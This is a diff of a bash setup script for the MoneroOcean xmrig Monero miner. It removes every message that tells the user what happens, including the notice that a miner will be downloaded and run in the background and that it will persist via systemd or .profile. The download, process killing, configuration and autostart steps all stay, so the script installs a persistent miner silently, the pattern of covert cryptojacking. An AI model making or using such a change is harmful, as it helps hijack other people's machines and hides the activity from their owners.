@@ -2,12 +2,6 @@
 
 VERSION=2.9
 
-# printing greetings
-
-echo "MoneroOcean mining setup script v$VERSION."
-echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
-
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
 fi
@@ -183,45 +177,27 @@ fi
 
 # printing intentions
 
-echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/moneroocean/miner.sh script."
-echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
 fi
-echo
 
-if ! sudo -n true 2>/dev/null; then
-  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
-else
-  echo "Mining in background will be performed using moneroocean_miner systemd service."
-fi
-
-echo
 echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
-echo
 
-echo
-echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous moneroocean miner (if any)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop moneroocean_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 
-echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
 [ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
 if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
@@ -229,7 +205,6 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/moneroocean/config.json
 $HOME/moneroocean/xmrig --help >/dev/null
 if (test $? -ne 0); then
@@ -239,23 +214,19 @@ if (test $? -ne 0); then
     echo "WARNING: Advanced version of $HOME/moneroocean/xmrig was removed by antivirus (or some other problem)"
   fi
 
-  echo "[*] Looking for the latest version of Monero miner"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
   if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/moneroocean/config.json
   $HOME/moneroocean/xmrig --help >/dev/null
   if (test $? -ne 0); then 
@@ -268,7 +239,6 @@ if (test $? -ne 0); then
   fi
 fi
 
-echo "[*] Miner $HOME/moneroocean/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -293,7 +263,6 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_b
 
 # preparing script
 
-echo "[*] Creating $HOME/moneroocean/miner.sh script"
 cat >$HOME/moneroocean/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
@@ -334,7 +303,6 @@ else
 
   else
 
-    echo "[*] Creating moneroocean_miner systemd service"
     cat >/tmp/moneroocean_miner.service <<EOL
 [Unit]
 Description=Monero miner service
@@ -375,8 +343,6 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
 fi
 echo ""
-
-echo "[*] Setup complete"
 
 
 
